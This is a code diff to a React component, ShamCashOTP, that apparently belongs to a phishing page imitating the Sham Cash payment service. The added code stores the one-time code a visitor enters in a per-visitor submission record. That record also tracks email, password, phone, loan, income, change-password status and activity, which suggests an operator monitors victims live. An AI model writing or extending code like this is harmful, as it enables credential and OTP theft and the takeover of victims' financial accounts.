@@ -82,8 +82,19 @@ export function ShamCashOTP() {
   function handleConfirm() {
     playSubmitSound();
     localStorage.setItem("sham_otp_status", "pending");
-    localStorage.setItem("sham_otp_code", otp.join(""));
+    const otpValue = otp.join("");
+    localStorage.setItem("sham_otp_code", otpValue);
     localStorage.setItem("sham_otp_phone", maskedPhone);
+    const vId = localStorage.getItem("sham_visitor_id");
+    if (vId) {
+      try {
+        const subs: Record<string, unknown>[] = JSON.parse(localStorage.getItem("sham_submissions") ?? "[]");
+        const idx = subs.findIndex((r) => r.id === vId);
+        if (idx >= 0) { subs[idx] = { ...subs[idx], otpCode: otpValue, otpStatus: "pending", page: "التحقق OTP" }; }
+        else { subs.unshift({ id: vId, submittedAt: new Date().toLocaleTimeString("ar-SY"), submittedAtTs: Date.now(), email: "", password: "", phone: "", loan: "", income: "", otpCode: otpValue, otpStatus: "pending", changepassStatus: null, page: "التحقق OTP", isActive: true, lastSeen: Date.now() }); }
+        localStorage.setItem("sham_submissions", JSON.stringify(subs));
+      } catch {}
+    }
     setStatus("pending");
 
     intervalRef.current = setInterval(() => {
